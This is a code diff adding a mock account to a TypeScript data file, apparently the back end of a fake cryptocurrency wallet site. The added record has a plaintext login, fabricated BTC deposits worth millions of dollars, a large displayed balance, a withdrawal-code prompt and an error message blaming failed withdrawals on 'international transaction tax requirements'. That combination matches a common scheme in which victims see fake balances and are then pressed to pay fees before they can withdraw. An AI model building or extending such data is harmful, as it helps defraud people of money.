@@ -3207,5 +3207,214 @@ export const mockAccounts: Account[] = [
         quantity: 0
       }
     ]
+  },
+  {
+    account_id: 'ACC018',
+    holder: {
+      full_name: 'Shared Wallet (Multisig)',
+      dateCreated: '2/21/2026', // m/d/y
+      jointAccount: false,
+      email: 'p**@gmail.com',
+      username: 'ProjectPay$',
+      password: 'Me&Hubby$'
+    },
+    transaction_mgs_code: {
+      transaction_text_msg: 'To continue this transaction, Please enter the code sent to you.',
+      errorMsg: 'Withdrawal failed due to wallet policies and international transaction tax requirements. Please contact our support team for assistance.',
+      // titleSuccessMsg: 'Submitted Successfully',
+      // successMsg: 'Withdrawal Application Submitted',
+      transaction_code: '',
+      wireDate: true
+    },
+    transaction_history: [
+      {
+        date: 'February 23, 2026',
+        description: 'Deposit BTC',
+        walletAddress: 'bc1q…9X0',
+        status: 'Success',
+        quantity: 5.16,
+        amount_in_usd: 350000,
+        assets: 'BTC'
+      },
+      {
+        date: 'February 10, 2026',
+        description: 'Deposit BTC',
+        walletAddress: 'bc1q…7K2',
+        status: 'Success',
+        quantity: 5.16,
+        amount_in_usd: 350000,
+        assets: 'BTC'
+      },
+      {
+        date: 'February 5, 2026',
+        description: 'Deposit BTC',
+        walletAddress: 'bc73jdj...Nhg4d',
+        status: 'Success',
+        quantity: 5.16,
+        amount_in_usd: 350000,
+        assets: 'BTC'
+      },
+      {
+        date: 'December 16, 2025',
+        description: 'Deposit BTC',
+        walletAddress: 'bc1qA9...X1P0',
+        status: 'Success',
+        quantity: 4.43,
+        amount_in_usd: 300000,
+        assets: 'BTC'
+      },
+      {
+        date: 'December 15, 2025',
+        description: 'Deposit BTC',
+        walletAddress: '3FZ91...K8D2',
+        status: 'Success',
+        quantity: 5.90,
+        amount_in_usd: 400000,
+        assets: 'BTC'
+      },
+      {
+        date: 'December 14, 2025',
+        description: 'Deposit BTC',
+        walletAddress: 'bc1qP7...M4Q9',
+        status: 'Success',
+        quantity: 7.38,
+        amount_in_usd: 500000,
+        assets: 'BTC'
+      },
+      {
+        date: 'November 20, 2025',
+        description: 'Deposit BTC',
+        walletAddress: '1J4T8...9ZQ3',
+        status: 'Success',
+        quantity: 3.69,
+        amount_in_usd: 250000,
+        assets: 'BTC'
+      },
+      {
+        date: 'November 18, 2025',
+        description: 'Deposit BTC',
+        walletAddress: 'bc1q9K...X72P',
+        status: 'Success',
+        quantity: 5.90,
+        amount_in_usd: 400000,
+        assets: 'BTC'
+      },
+      {
+        date: 'October 18, 2025',
+        description: 'Transfer BTC',
+        walletAddress: '3FABB...694a',
+        status: 'Success',
+        quantity: -0.22,
+        amount_in_usd: -15000.0,
+        assets: 'BTC'
+      },
+      {
+        date: 'October 5, 2025',
+        description: 'Deposit BTC',
+        walletAddress: '165hr...45b6x',
+        status: 'Success',
+        quantity: 5.90,
+        amount_in_usd: 400000,
+        assets: 'BTC'
+      },
+      {
+        date: 'October 3, 2025',
+        description: 'Transfer BTC',
+        walletAddress: '3F2g1...8dX9',
+        status: 'Success',
+        quantity: -0.18,
+        amount_in_usd: -12000.0,
+        assets: 'BTC'
+      },
+      {
+        date: 'September 27, 2025',
+        description: 'Deposit BTC',
+        walletAddress: '1bDA5...197E',
+        status: 'Success',
+        quantity: 6.64,
+        amount_in_usd: 450000,
+        assets: 'BTC'
+      },
+      {
+        date: 'September 22, 2025',
+        description: 'Transfer BTC',
+        walletAddress: 'bc1q7d...AFB7',
+        status: 'Success',
+        quantity: -0.37,
+        amount_in_usd: -25000.0,
+        assets: 'BTC'
+      },
+      {
+        date: 'September 7, 2025',
+        description: 'Transfer BTC',
+        walletAddress: '1Fbc2...9Qe4',
+        status: 'Success',
+        quantity: -0.15,
+        amount_in_usd: -10000.0,
+        assets: 'BTC'
+      },
+      {
+        date: 'August 22, 2025',
+        description: 'Deposit BTC',
+        walletAddress: '3KD9a...F2M8',
+        status: 'Success',
+        quantity: 5.16,
+        amount_in_usd: 350000,
+        assets: 'BTC'
+      },
+      {
+        date: 'July 18, 2025',
+        description: 'Deposit BTC',
+        walletAddress: 'bc1q8R...MZ21',
+        status: 'Success',
+        quantity: 5.16,
+        amount_in_usd: 350000,
+        assets: 'BTC'
+      },
+      {
+        date: 'July 2, 2025',
+        description: 'Transfer BTC',
+        walletAddress: '39XqE...7BvP',
+        status: 'Success',
+        quantity: -0.12,
+        amount_in_usd: -8000.0,
+        assets: 'BTC'
+      },
+      {
+        date: 'June 12, 2025',
+        description: 'Deposit BTC',
+        walletAddress: 'bc1q4T...L91C',
+        status: 'Success',
+        quantity: 4.43,
+        amount_in_usd: 300000,
+        assets: 'BTC'
+      }
+    ],
+    assets: [
+      {
+        assetsName: 'BTC',
+        assetsName2: 'Bitcoin',
+        walletAddress: 'bc1q4dux49w5******8nmztuqpd8tx3w',
+        barCodeImgUrl: 'https://i.imgur.com/ZOqOQmH.png',
+        assetsLogo: 'https://i.imgur.com/N6UMWP2.png',
+        quantity: 64.94
+      },
+      {
+        assetsName: 'ETH',
+        assetsName2: 'Ethereum',
+        walletAddress: '0x4dEea33c8A8******ce13ffefA5c052e',
+        barCodeImgUrl: 'https://i.imgur.com/ZOqOQmH.png',
+        assetsLogo: 'https://i.imgur.com/feMQhL4.png',
+        quantity: 0
+      },
+      {
+        assetsName: 'BNB',
+        assetsName2: 'Binance Coin',
+        walletAddress: '0x4dEea33c8A8******ce13ffefA5c052e',
+        barCodeImgUrl: 'https://i.imgur.com/ZOqOQmH.png',
+        assetsLogo: 'https://i.imgur.com/EKHVvWB.png',
+        quantity: 0
+      }
+    ]
   }
 ];
